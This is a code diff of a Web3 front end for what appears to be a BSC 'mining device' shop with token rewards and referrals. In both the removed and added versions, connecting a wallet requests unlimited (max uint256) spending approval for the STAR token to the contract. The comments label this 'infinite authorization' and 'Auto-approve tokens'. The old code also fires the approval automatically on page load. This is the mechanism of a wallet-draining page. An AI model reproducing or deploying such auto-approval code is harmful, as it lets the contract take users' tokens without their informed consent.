                 web3 = new Web3(window.ethereum);
                 contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
                 
-                // 监听账户变化
-                window.ethereum.on('accountsChanged', handleAccountsChanged);
-                window.ethereum.on('chainChanged', () => location.reload());
-                
-                return true;
-            }
-            return false;
-        }
-
-        // 修复的连接钱包函数
-        async function connectWallet() {
-            showLoading(true);
-            try {
-                if (!await initWeb3()) {
-                    throw new Error('MetaMask not found. Please install MetaMask or use a wallet browser.');
+                const accounts = await web3.eth.getAccounts();
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    showPage('shop');
+                    checkAdmin();
                 }
-
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
-                });
-                
-                if (accounts.length === 0) {
-                    throw new Error('No accounts found');
-                }
-
-                userAccount = accounts[0];
-                
-                // 验证网络
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== '0x38' && chainId !== '0x61') {
-                    throw new Error('Please switch to BSC network');
-                }
-
-                // 无限授权
-                await approveToken();
-                
-                // 更新界面
-                updateWalletDisplay();
-                showScreen('dashboard');
-                loadAllData();
-                
-                showToast('Wallet connected successfully');
-            } catch (error) {
-                console.error('Connection error:', error);
-                showToast('Failed to connect: ' + error.message, true);
-            }
-            showLoading(false);
-        }
-
-        // 修复的授权函数
-        async function approveToken() {
-            try {
-                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                const allowance = await tokenContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
-                
-                if (allowance === '0') {
-                    showToast('Approving tokens...');
-                    await tokenContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ 
-                        from: userAccount 
-                    });
-                    showToast('Approved successfully!');
-                }
-            } catch (error) {
-                console.warn('Approval skipped:', error.message);
-                showToast('Please approve token spending in MetaMask', true);
-            }
-        }
-
-        // 修复的购买函数
-        async function buyInitialMachine() {
-            if (!userAccount) {
-                showToast('Please connect wallet first', true);
-                return;
-            }
-
-            showLoading(true);
-            try {
-                const price = web3.utils.toWei('0.01', 'ether');
-                await contract.methods.buyInitialMachine().send({ 
-                    from: userAccount,
-                    value: price
-                });
-                showToast('Moonlight converter purchased successfully!');
-                loadAllData();
-            } catch (error) {
-                console.error('Purchase error:', error);
-                showToast('Purchase failed: ' + error.message, true);
-            }
-            showLoading(false);
-        }
-
-        async function buyTestMachine() {
-            if (!userAccount) {
-                showToast('Please connect wallet first', true);
-                return;
-            }
-
-            showLoading(true);
-            try {
-                const price = web3.utils.toWei('0.0001', 'ether');
-                await contract.methods.buyTestMachine().send({ 
-                    from: userAccount,
-                    value: price
-                });
-                showToast('Phantom debugger purchased successfully!');
-                loadAllData();
-            } catch (error) {
-                console.error('Purchase error:', error);
-                showToast('Purchase failed: ' + error.message, true);
-            }
-            showLoading(false);
-        }
-
-        async function buyPowerMachine(tierId, count) {
-            if (!userAccount) {
-                showToast('Please connect wallet first', true);
-                return;
-            }
-
-            if (!count || count < 1 || count > 100) {
-                showToast('Please enter valid count (1-100)', true);
-                return;
-            }
-
-            showLoading(true);
-            try {
-                await contract.methods.buyPowerMachine(tierId, count).send({ 
-                    from: userAccount
-                });
-                showToast(`Purchased ${count} device(s) successfully!`);
-                loadAllData();
-            } catch (error) {
-                console.error('Purchase error:', error);
-                showToast('Purchase failed: ' + error.message, true);
-            }
-            showLoading(false);
-        }
-
-        // 修复的领取奖励函数
-        async function claimRewards() {
-            if (!userAccount) {
-                showToast('Please connect wallet first', true);
-                return;
-            }
-
-            showLoading(true);
-            try {
-                await contract.methods.claimRewards().send({ from: userAccount });
-                showToast('Rewards claimed successfully!');
-                loadAllData();
-            } catch (error) {
-                console.error('Claim error:', error);
-                showToast('Claim failed: ' + error.message, true);
-            }
-            showLoading(false);
-        }
-
-        // 修复的设置推荐人函数
-        async function setReferrer() {
-            if (!userAccount) {
-                showToast('Please connect wallet first', true);
-                return;
-            }
-
-            const referrer = document.getElementById('referrer-input').value.trim();
-            
-            if (!web3.utils.isAddress(referrer)) {
-                showToast('Please enter a valid address', true);
-                return;
-            }
-
-            if (referrer.toLowerCase() === userAccount.toLowerCase()) {
-                showToast('Cannot set yourself as referrer', true);
-                return;
-            }
-
-            showLoading(true);
-            try {
-                await contract.methods.setReferrer(referrer).send({ from: userAccount });
-                showToast('Referrer set successfully!');
-                document.getElementById('referrer-input').value = '';
-                loadAllData();
-            } catch (error) {
-                console.error('Set referrer error:', error);
-                showToast('Set referrer failed: ' + error.message, true);
-            }
-            showLoading(false);
-        }
-
-        // 数据加载
-        async function loadAllData() {
-            if (!userAccount) return;
-            
-            try {
-                await Promise.all([
-                    loadUserData(),
-                    loadGlobalData(),
-                    loadShopData()
-                ]);
-            } catch (error) {
-                console.error('Load data error:', error);
-            }
-        }
-
-        async function loadUserData() {
-            if (!userAccount) return;
-
-            try {
-                // 用户仪表板
-                const dashboard = await contract.methods.getUserDashboard(userAccount).call();
-                
-                document.getElementById('initial-count').textContent = dashboard.normal;
-                document.getElementById('test-count').textContent = dashboard.test;
-                
-                for (let i = 0; i < 4; i++) {
-                    document.getElementById(`power-${i}`).textContent = dashboard.power[i];
-                }
-
-                document.getElementById('unclaimed-amount').textContent = `(${parseFloat(web3.utils.fromWei(dashboard.unclaimed, 'ether')).toFixed(4)})`;
-                document.getElementById('referral-rewards').textContent = `${parseFloat(web3.utils.fromWei(dashboard.totalRefReward, 'ether')).toFixed(4)} STAR`;
-                document.getElementById('my-referral').textContent = userAccount;
-
-                // 代币余额
-                const balance = await tokenContract.methods.balanceOf(userAccount).call();
-                document.getElementById('user-balance').textContent = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(4);
-
-                // 管理员权限
-                const isAdmin = await contract.methods.admin(userAccount).call();
-                document.getElementById('test-device').style.display = isAdmin ? 'block' : 'none';
-                document.getElementById('test-shop').style.display = isAdmin ? 'block' : 'none';
-
-                // 更新进度条
-                const userPower = dashboard.totalPower;
-                const globalPower = await contract.methods.totalNetworkPower().call();
-                const percentage = globalPower > 0 ? (userPower / globalPower * 100).toFixed(2) : 0;
-                document.getElementById('power-progress').style.width = percentage + '%';
-                document.getElementById('user-power').textContent = `${parseFloat(web3.utils.fromWei(userPower, 'ether')).toFixed(4)} / ${parseFloat(web3.utils.fromWei(globalPower, 'ether')).toFixed(4)}`;
-
-            } catch (error) {
-                console.error('User data load error:', error);
-            }
-        }
-
-        async function loadGlobalData() {
-            try {
-                const global = await contract.methods.getGlobalDashboard().call();
-                const stats = [
-                    `<strong>${global.totalMines}</strong> <span data-en="Total Devices" data-zh="总设备">总设备</span>`,
-                    `<strong>${parseFloat(web3.utils.fromWei(global.networkPower, 'ether')).toFixed(4)}</strong> <span data-en="Network Power" data-zh="全网算力">全网算力</span>`,
-                    `<strong>${parseFloat(web3.utils.fromWei(global.poolBalance, 'ether')).toFixed(4)}</strong> <span data-en="Pool Balance (STAR)" data-zh="奖励池余额">奖励池余额</span>`,
-                    `<strong>${parseFloat(web3.utils.fromWei(global.dailyProduction, 'ether')).toFixed(4)}</strong> <span data-en="Daily Production" data-zh="日产量">日产量</span>`
-                ];
-                document.getElementById('global-stats').innerHTML = stats.map(s => `<p style="margin: 8px 0;">${s}</p>`).join('');
-            } catch (error) {
-                console.error('Global data load error:', error);
-            }
-        }
-
-        async function loadShopData() {
-            try {
-                const shopContainer = document.getElementById('power-shop');
-                const names = ['星尘收集器L1', '量子蒲公英L2', '极光编织机L3', '银河过滤器L4'];
-                const enNames = ['Stardust Collector L1', 'Quantum Dandelion L2', 'Aurora Weaver L3', 'Galaxy Filter L4'];
-                
-                shopContainer.innerHTML = '';
-                for (let i = 0; i < 4; i++) {
-                    const tier = await contract.methods.machineTiers(i).call();
-                    const div = document.createElement('div');
-                    div.className = 'shop-item';
-                    div.innerHTML = `
-                        <h4>${currentLang === 'zh' ? names[i] : enNames[i]}</h4>
-                        <p><span data-en="Price:" data-zh="价格：">价格：</span> ${parseFloat(web3.utils.fromWei(tier.priceToken, 'ether')).toFixed(0)} STAR</p>
-                        <p><span data-en="Power Multiplier:" data-zh="算力倍数：">算力倍数：</span> ${(tier.powerMultiplier / 1e18).toFixed(2)}x</p>
-                        <div style="display: flex; gap: 8px; margin-top: 10px;">
-                            <input type="number" min="1" max="100" value="1" id="count-${i}" style="width: 60px; padding: 8px; font-size: 14px;">
-                            <button class="action-btn" onclick="buyPowerMachine(${i}, document.getElementById('count-${i}').value)" style="padding: 8px 16px; font-size: 14px;">
-                                <span data-en="Buy" data-zh="购买">购买</span>
-                            </button>
-                        </div>
-                    `;
-                    shopContainer.appendChild(div);
-                }
-            } catch (error) {
-                console.error('Shop data load error:', error);
-            }
-        }
-
-        // UI工具函数
-        function showScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(screenId).classList.add('active');
-            
-            if (screenId !== 'wallet-connect' && userAccount) {
-                loadAllData();
-            }
-        }
-
-        function updateWalletDisplay() {
-            if (userAccount) {
-                const short = userAccount.substring(0, 6) + '...' + userAccount.substring(38);
-                document.getElementById('wallet-short').textContent = short;
-            }
-        }
-
-        function showFullAddress() {
-            if (userAccount) {
-                navigator.clipboard.writeText(userAccount).then(() => {
-                    showToast('Address copied to clipboard!');
-                });
-            }
-        }
-
-        function showLoading(show) {
-            document.getElementById('loading').classList.toggle('active', show);
-        }
-
-        function showToast(message, isError = false) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.className = `toast ${isError ? 'error' : ''}`;
-            toast.style.display = 'block';
-            
-            setTimeout(() => {
-                toast.style.display = 'none';
-            }, 3000);
-        }
-
-        function handleAccountsChanged(accounts) {
-            if (accounts.length === 0) {
-                userAccount = '';
-                showScreen('wallet-connect');
-            } else if (accounts[0] !== userAccount) {
-                userAccount = accounts[0];
-                updateWalletDisplay();
-                loadAllData();
-            }
-        }
-
-        function toggleLanguage() {
-            currentLang = currentLang === 'zh' ? 'en' : 'zh';
-            document.querySelectorAll('[data-en][data-zh]').forEach(el => {
-                el.textContent = el.getAttribute(currentLang === 'zh' ? 'data-zh' : 'data-en');
-            });
-            document.querySelector('.lang-switch span').textContent = currentLang === 'zh' ? 'EN' : '中';
-            
-            if (userAccount) {
-                loadShopData();
-            }
-        }
-
-        // 页面加载完成后自动连接
-        window.addEventListener('load', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        userAccount = accounts[0];
-                        await initWeb3();
-                        await approveToken();
-                        updateWalletDisplay();
-                        showScreen('dashboard');
-                        loadAllData();
-                    }
-                } catch (error) {
-                    console.error('Auto-connect error:', error);
-                }
+            } else {
+                showToast('请安装MetaMask或使用钱包浏览器', 'error');
             }
         });
+
+        async function connectWallet() {
+            try {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const accounts = await web3.eth.getAccounts();
+                userAddress = accounts[0];
+                
+                // Auto-approve tokens
+                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                const allowance = await tokenContract.methods.allowance(userAddress, CONTRACT_ADDRESS).call();
+                
+                if (allowance < web3.utils.toWei('1000000', 'ether')) {
+                    await tokenContract.methods.approve(CONTRACT_ADDRESS, maxUint256).send({ from: userAddress });
+                }
+                
+                showPage('shop');
+                await checkAdmin();
+            } catch (error) {
+                showToast(error.message || '连接失败', 'error');
+            }
+        }
+
+        async function checkAdmin() {
+            try {
+                isAdmin = await contract.methods.admin(userAddress).call();
+                if (isAdmin) {
+                    document.getElementById('test-section').style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Admin check error:', error);
+            }
+        }
+
+        // Buy functions
+        async function buyInitialDevice() {
+            try {
+                await contract.methods.buyInitialMachine().send({ 
+                    from: userAddress, 
+                    value: web3.utils.toWei('0.01', 'ether') 
+                });
+                showToast('购买成功! / Purchase successful!', 'success');
+            } catch (error) {
+                showToast(error.message || '购买失败 / Purchase failed', 'error');
+            }
+        }
+
+        async function buyTestDevice() {
+            const count = parseInt(document.getElementById('test-count').value);
+            try {
+                await contract.methods.buyTestMachine().send({ 
+                    from: userAddress, 
+                    value: web3.utils.toWei((0.0001 * count).toString(), 'ether') 
+                });
+                showToast('购买成功! / Purchase successful!', 'success');
+            } catch (error) {
+                showToast(error.message || '购买失败 / Purchase failed', 'error');
+            }
+        }
+
+        async function buyAdvancedDevice(tierId) {
+            const count = parseInt(document.getElementById(`advanced-${tierId}`).value);
+            if (count < 1 || count > 100) {
+                showToast('数量必须在1-100之间 / Count must be 1-100', 'error');
+                return;
+            }
+            
+            try {
+                await contract.methods.buyPowerMachine(tierId, count).send({ from: userAddress });
+                showToast('购买成功! / Purchase successful!', 'success');
+            } catch (error) {
+                showToast(error.message || '购买失败 / Purchase failed', 'error');
+            }
+        }
+
+        function showPage(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(`${page}-page`).classList.add('active');
+        }
+
+        function showToast(message, type) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${type}`;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
     </script>
 </body>
 </html>
